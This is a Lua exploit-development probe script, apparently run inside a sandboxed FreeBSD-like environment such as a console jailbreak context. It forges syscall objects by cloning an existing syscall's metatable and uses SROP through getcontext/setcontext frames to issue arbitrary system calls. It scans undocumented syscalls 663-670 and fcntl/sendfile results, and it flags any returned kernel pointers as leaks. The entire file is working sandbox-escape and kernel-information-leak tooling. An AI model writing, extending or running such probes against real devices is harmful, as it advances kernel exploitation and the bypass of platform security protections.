-- CRASH_CLASS: LOW
-- PROBE 143e: sys 670 via make_syscall (not SROP)
-- Isolation sweep showed 670 returning 0 via make_syscall,
-- but 143d showed -1 via SROP. Test the dispatch difference.

print("=== PROBE 143e: SYS 670 MAKE_SYSCALL ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local pid = to_num(sc20())
print("pid=" .. pid)

--------------------------------------------------------------------
-- [A] sys 670 via make_syscall — basic call
--------------------------------------------------------------------
print("--- [A] make_syscall(670) ---")

local sc670 = make_syscall(670)
local ok, rv = pcall(function()
    return sc670(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
end)
if ok then
    local rh, rl = get_hi_lo(rv)
    print("[A] ret=" .. rl .. " hi=" .. rh .. " raw=" .. hex(rv))
else
    print("[A] pcall failed: " .. tostring(rv))
end

--------------------------------------------------------------------
-- [B] All live handlers via make_syscall
--------------------------------------------------------------------
print("")
print("--- [B] live handlers via make_syscall ---")

local live = {663, 664, 666, 667, 669, 670}
for _, sn in ipairs(live) do
    local sc = make_syscall(sn)
    ok, rv = pcall(function()
        return sc(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rh, rl = get_hi_lo(rv)
        print("[B] sys " .. sn .. " ret=" .. rl .. " raw=" .. hex(rv))
    else
        print("[B] sys " .. sn .. " FAIL: " .. tostring(rv))
    end
end

--------------------------------------------------------------------
-- [C] sys 670 with output buffer via make_syscall
--------------------------------------------------------------------
print("")
print("--- [C] 670 with buffer ---")

local buf = memory.alloc(0x200)
for off = 0, 0x1FF, 4 do wd(buf + off, 0xDEADDEAD) end

ok, rv = pcall(function()
    return sc670(uint64(buf), uint64(0x100), uint64(0), uint64(0), uint64(0), uint64(0))
end)
if ok then
    local rh, rl = get_hi_lo(rv)
    print("[C] ret=" .. rl)
    local changed = false
    for off = 0, 0xFC, 4 do
        local v = safe_rd(buf + off) or 0
        if v ~= 0xDEADDEAD then
            changed = true
            print("[C] +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
        end
    end
    if not changed then print("[C] buffer unchanged") end
    for off = 0, 0xF8, 8 do
        local q = safe_rq(buf + off)
        if q then
            local qh, ql = get_hi_lo(q)
            if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
                print("[C] *** KERNEL PTR +" .. string.format("%02X", off) .. "=" .. hex(q) .. " ***")
            end
        end
    end
end

--------------------------------------------------------------------
-- [D] Arg sensitivity via make_syscall
--------------------------------------------------------------------
print("")
print("--- [D] arg patterns ---")

local tests = {
    {0, 0, 0, "0,0,0"},
    {1, 0, 0, "1,0,0"},
    {0, 1, 0, "0,1,0"},
    {0, 0, 1, "0,0,1"},
    {1, 1, 0, "1,1,0"},
    {1, 1, 1, "1,1,1"},
    {2, 0, 0, "2,0,0"},
    {3, 0, 0, "3,0,0"},
    {4, 0, 0, "4,0,0"},
}

for _, t in ipairs(tests) do
    ok, rv = pcall(function()
        return sc670(uint64(t[1]), uint64(t[2]), uint64(t[3]),
                     uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rh, rl = get_hi_lo(rv)
        print("[D] (" .. t[4] .. ") ret=" .. rl)
    else
        print("[D] (" .. t[4] .. ") FAIL")
    end
end

--------------------------------------------------------------------
-- [E] Try 663-664 with various arg patterns via make_syscall
--------------------------------------------------------------------
print("")
print("--- [E] sys 663/664 arg scan ---")

for _, sn in ipairs({663, 664}) do
    local sc = make_syscall(sn)
    for off = 0, 0x1FF, 4 do wd(buf + off, 0) end

    -- (buf, size)
    ok, rv = pcall(function()
        return sc(uint64(buf), uint64(0x100), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rh, rl = get_hi_lo(rv)
        local b0 = safe_rd(buf) or 0
        print("[E] sys " .. sn .. " (ptr,size) ret=" .. rl .. " buf[0]=0x" .. string.format("%08X", b0))
        if b0 ~= 0 then
            for boff = 4, 0x3C, 4 do
                local bv = safe_rd(buf + boff) or 0
                if bv ~= 0 then
                    print("[E]   +" .. string.format("%02X", boff) .. "=0x" .. string.format("%08X", bv))
                end
            end
        end
    else
        print("[E] sys " .. sn .. " (ptr,size) FAIL")
    end

    -- (cmd, buf, size) for cmd 0-7
    for cmd = 0, 7 do
        for off = 0, 0x1FF, 4 do wd(buf + off, 0) end
        ok, rv = pcall(function()
            return sc(uint64(cmd), uint64(buf), uint64(0x100), uint64(0), uint64(0), uint64(0))
        end)
        if ok then
            local rh, rl = get_hi_lo(rv)
            if rl == 0 then
                local b0 = safe_rd(buf) or 0
                print("[E] sys " .. sn .. " cmd=" .. cmd .. " ret=0! buf[0]=0x" .. string.format("%08X", b0))
                for boff = 0, 0x7C, 8 do
                    local q = safe_rq(buf + boff)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
                            print("[E] *** SYS " .. sn .. " CMD=" .. cmd .. " KPTR +" .. string.format("%02X", boff) .. "=" .. hex(q) .. " ***")
                        end
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- [F] Try fcntl(92) and sendfile(393) — untested syscalls
--------------------------------------------------------------------
print("")
print("--- [F] fcntl + sendfile ---")

-- Create a socketpair first
local sc_gc2 = make_syscall(421)
local sc_sr2 = make_syscall(417)
local srop_ctx2 = memory.alloc(0x500)
pcall(function() return sc_gc2(uint64(srop_ctx2)) end)
local rip2 = memory.read_qword(srop_ctx2 + 0x40 + 0xA0)
local r2h, r2l = get_hi_lo(rip2)
local sc_a2 = uint64(string.format("0x%X%08X", r2h, r2l - 2))

local function srop2(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc2(uint64(srop_ctx2)) end)
    wq(srop_ctx2 + 0x40 + 0xA0, sc_a2)
    wq(srop_ctx2 + 0x40 + 0x38, uint64(num))
    if a1 then wq(srop_ctx2 + 0x40 + 0x08, a1) end
    if a2 then wq(srop_ctx2 + 0x40 + 0x10, a2) end
    if a3 then wq(srop_ctx2 + 0x40 + 0x18, a3) end
    if a4 then wq(srop_ctx2 + 0x40 + 0x50, a4) end
    if a5 then wq(srop_ctx2 + 0x40 + 0x28, a5) end
    if a6 then wq(srop_ctx2 + 0x40 + 0x30, a6) end
    local ok2, rv2 = pcall(function() return sc_sr2(uint64(srop_ctx2)) end)
    return rv2
end

-- socketpair(AF_UNIX=1, SOCK_STREAM=1, 0, sv)
local sv = memory.alloc(16)
wd(sv, 0xDEAD); wd(sv + 4, 0xDEAD)
srop2(135, uint64(1), uint64(1), uint64(0), uint64(sv))
local fd_a = safe_rd(sv) or 0
local fd_b = safe_rd(sv + 4) or 0
print("[F] socketpair: " .. fd_a .. ", " .. fd_b)

if fd_a > 0 and fd_a < 256 then
    -- fcntl(fd, F_GETFL=3) — get file status flags
    local sc_fcntl = make_syscall(92)
    ok, rv = pcall(function()
        return sc_fcntl(uint64(fd_a), uint64(3))
    end)
    if ok then
        local rh2, rl2 = get_hi_lo(rv)
        print("[F] fcntl(F_GETFL) ret=" .. rl2 .. " raw=" .. hex(rv))
    else
        print("[F] fcntl FAIL: " .. tostring(rv))
    end

    -- fcntl(fd, F_DUPFD=0, 0) — duplicate fd
    ok, rv = pcall(function()
        return sc_fcntl(uint64(fd_a), uint64(0), uint64(0))
    end)
    if ok then
        local rh2, rl2 = get_hi_lo(rv)
        print("[F] fcntl(F_DUPFD) ret=" .. rl2 .. " raw=" .. hex(rv))
        if rl2 > 0 and rl2 < 256 then
            print("[F] *** DUP WORKS! new_fd=" .. rl2 .. " ***")
            srop2(6, uint64(rl2))
        end
    else
        print("[F] fcntl(F_DUPFD) FAIL")
    end

    -- fcntl(fd, F_SETFL=4, O_NONBLOCK=0x0004) — set non-blocking
    ok, rv = pcall(function()
        return sc_fcntl(uint64(fd_a), uint64(4), uint64(4))
    end)
    if ok then
        local rh2, rl2 = get_hi_lo(rv)
        print("[F] fcntl(F_SETFL,NONBLOCK) ret=" .. rl2)
    else
        print("[F] fcntl(F_SETFL) FAIL")
    end

    -- Try sendfile(393): sendfile(fd_b, fd_a, offset_p, nbytes, hdtr, sbytes, flags)
    local sc_sf = make_syscall(393)
    local off_p = memory.alloc(8)
    wq(off_p, uint64(0))
    local sbytes_p = memory.alloc(8)
    wq(sbytes_p, uint64(0))

    -- Write some data to fd_a first
    local wbuf = memory.alloc(16)
    wd(wbuf, 0x41424344)
    srop2(4, uint64(fd_a), uint64(wbuf), uint64(4))

    ok, rv = pcall(function()
        return sc_sf(uint64(fd_b), uint64(fd_a), uint64(0), uint64(4),
                     uint64(0), uint64(sbytes_p), uint64(0))
    end)
    if ok then
        local rh2, rl2 = get_hi_lo(rv)
        local sb = safe_rd(sbytes_p) or 0
        print("[F] sendfile ret=" .. rl2 .. " sbytes=" .. sb)
    else
        print("[F] sendfile FAIL: " .. tostring(rv))
    end

    srop2(6, uint64(fd_a))
    srop2(6, uint64(fd_b))
end

print("")
print("=== DONE ===")
